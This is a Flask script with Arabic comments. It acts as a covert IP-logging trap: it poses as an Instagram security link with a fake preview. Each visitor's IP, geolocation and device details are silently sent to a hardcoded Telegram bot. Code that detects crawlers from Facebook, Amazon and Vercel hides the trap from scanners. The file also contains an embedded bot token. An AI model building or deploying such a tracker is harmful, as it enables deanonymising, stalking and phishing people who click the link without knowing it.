from flask import Flask, request
import requests

app = Flask(__name__)

# تأكد من التوكن والآيدي جيداً
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQS0zvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        # استخدام json=payload يضمن وصول الرسالة عبر Vercel 100%
        requests.post(url, json=payload, timeout=10)
    except:
        pass

@app.route('/')
@app.route('/check-status')
@app.route('/photo.jpg')
def track():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # 1. فلترة البوتات المزعجة (تجاوز الحماية)
    ua_lower = user_agent.lower()
    if any(bot in ua_lower for bot in ['amazon', 'vercel', 'facebook', 'headlesschrome']):
        return "Not Found", 404

    # 2. جلب الموقع مع حماية الكود من التوقف
    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        location = f"{geo_res.get('city')}, {geo_res.get('country')}"
    except:
        location = "Unknown"

    # 3. إرسال التقرير
    report = (
        f"🎯 <b>صيد صامت جديد!</b>\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {location}\n"
        f"📱 <b>الجهاز:</b> {user_agent[:50]}..."
    )
    send_to_telegram(report)
    
    return """
    <html><head>
    <meta property="og:title" content="Instagram Security">
    <meta property="og:type" content="video.other">
    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
    </head><body><h1>404 Not Found</h1></body></html>
    """, 200

if __name__ == '__main__':
    app.run()
